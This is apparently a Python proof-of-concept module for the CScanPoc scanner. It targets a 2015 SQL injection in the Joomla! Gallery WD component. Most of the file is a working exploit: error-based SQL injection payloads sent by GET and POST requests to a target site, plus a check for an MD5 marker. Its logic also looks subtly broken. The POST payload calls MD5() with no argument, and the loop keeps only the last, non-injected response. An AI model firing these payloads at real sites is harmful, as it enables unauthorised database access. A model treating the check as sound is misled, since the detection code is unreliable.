# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Joomla_0017'  # 平台漏洞编号，留空
    name = 'Joomla! Gallery WD SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-30'  # 漏洞公布时间
    desc = '''
        Joomla! Gallery WD /index.php SQL Injection.
    '''  # 漏洞描述
    ref = 'http://cxsecurity.com/issue/WLB-2015030203'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eacb00c8-6c9f-4db6-b08f-e60d15ab415d'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = (
                "index.php?option=com_gallery_wd&view=gallerybox&image_id=19&gallery_id=2&theme_id=1%20AND%20(SELECT%206173%20FROM(SELECT%20COUNT(*),CONCAT(0x716b627871,(MID((IFNULL(CAST(MD5(3.14)%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)",
                "index.php?option=com_gallery_wd&view=gallerybox&image_id=19&gallery_id=2",
            )
            post = "image_id=19%20AND%20(SELECT%206173%20FROM(SELECT%20COUNT(*),CONCAT(0x716b627871,(MID((IFNULL(CAST(MD5()%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&rate=&ajax_task=save_hit_count&task=gallerybox.ajax_search"
            for payload in payloads:
                target = arg + payload
                code, head, res1, _, _ = hh.http(target)
                req = requests.post(target, data=post)
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            elif req.status_code == 200 and '4beed3b9c4a886067de0e3a094246f78' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
